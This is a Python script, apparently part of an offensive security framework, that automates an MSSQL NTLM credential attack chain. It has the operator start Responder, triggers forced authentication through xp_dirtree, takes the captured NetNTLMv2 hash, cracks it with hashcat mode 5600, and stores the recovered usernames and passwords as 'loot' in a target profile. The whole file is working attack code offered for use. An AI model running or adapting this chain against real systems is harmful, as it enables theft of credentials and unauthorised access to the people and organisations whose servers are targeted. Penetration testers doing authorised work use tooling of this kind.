import argparse
import sys
import time
import os
from core.runner import run_module_by_name
from core.target import load_current_profile, target_add_cred
from core.paths import get_chain_artifacts_dir

def run(args):
    # --- ANSI COLOR PALETTE ---
    G, R, C, Y, B, W = '\033[92m', '\033[91m', '\033[96m', '\033[93m', '\033[94m', '\033[0m'
    BOLD = '\033[1m'
    
    # --- 1. SETUP ---
    data, _ = load_current_profile()
    artifacts = get_chain_artifacts_dir(data["name"], "mssql_ntlm")
    hashes_file = artifacts / "ntlm_hashes.txt"
    cracked_file = artifacts / "cracked.txt"
    interface = data.get("interface", "tun0")

    # --- HEADER ---
    print(f"\n{B}┌──────────────────────────────────────────────────────────┐{W}")
    print(f"{B}│{W}  {BOLD}{C}CHAIN:{W} MSSQL NTLM CAPTURE & IMPORT                   {B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    # --- 2. CAPTURE STEP ---
    print(f"\n{B}[{W}{Y}!{W}{B}]{W} {BOLD}STEP 1: LISTENER SETUP{W}")
    print(f"    {B}╰─{W} Run in separate terminal: {G}sudo responder -I {interface} -v{W}")
    
    input(f"\n    {B}[{W}{C}?{W}{B}]{W} Press {BOLD}[ENTER]{W} once Responder is listening...")

    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 2: TRIGGERING AUTH{W}")
    print(f"    {B}╰─{W} Sending {C}xp_dirtree{W} forced authentication request...", end="\r")
    
    run_module_by_name("mssql.forceauth", [], data=data)
    
    print(f"    {B}╰─{W} Forced authentication: {G}TRIGGERED{W}                         ")

    print(f"\n{B}[{W}{Y}!{W}{B}]{W} {BOLD}STEP 3: HASH COLLECTION{W}")
    print(f"    {B}╰─{W} Check Responder. Paste raw hash below and hit {BOLD}CTRL+D{W}:")
    print(f"{B}────────────────────────────────────────────────────────────{W}")

    try:
        user_input = sys.stdin.read().strip()
        print(f"{B}────────────────────────────────────────────────────────────{W}")
        
        if not user_input:
            print(f"\n{R}[-] Error: No hash provided. Aborting.{W}")
            return
            
        with open(hashes_file, "w") as f:
            f.write(user_input + "\n")
            
    except KeyboardInterrupt:
        print(f"\n{R}[!] Aborted by user.{W}")
        return

    # --- 3. CRACK STEP ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 4: CRACKING{W}")
    print(f"    {B}╰─{W} Target: {hashes_file.name}")
    print(f"    {B}╰─{W} Engine: {C}Hashcat (Mode 5600){W}")
    
    # We briefly hide stdout to prevent the raw hashcat 'counting lines' noise
    # but keep the essentials if your runner handles it.
    run_module_by_name("crack.hash", [
        str(hashes_file),
        "--mode", "5600",
        "--out", str(cracked_file),
        "--quiet"
    ], data)

    if not ensure_nonempty_file(cracked_file, "Cracking failed or no results."):
        return

    # --- 4. IMPORT STEP ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 5: DATABASE IMPORT{W}")
    
    new_creds = run_module_by_name("parse.hash", [str(cracked_file)], data)

    if new_creds:
        for c in new_creds:
            # Visual formatting for the recovered loot
            print(f"    {G}┌──{W} {BOLD}RECOVERED LOOT{W}")
            print(f"    {G}│{W} {BOLD}USER:{W} {C}{c['user']}{W}")
            print(f"    {G}│{W} {BOLD}PASS:{W} {G}{c['secret']}{W}")
            print(f"    {G}└──{W}")
            
            target_add_cred(
                argparse.Namespace(
                    user=c["user"],
                    password=c["secret"] if c["type"] == "password" else None,
                    hash=c["secret"] if c["type"] == "ntlm" else None,
                    aes=None,
                    ccache=None
                )
            )
        print(f"\n{B}[{W}{G}*{W}{B}]{W} Successfully imported {len(new_creds)} credentials.")
    
    print(f"\n{B}─────────────────────── {G}CHAIN COMPLETE{W} ───────────────────────\n")

def ensure_nonempty_file(path, msg):
    if path.exists() and path.stat().st_size > 0:
        return True
    print(f"\033[91m[-] {msg}\033[0m")
    return False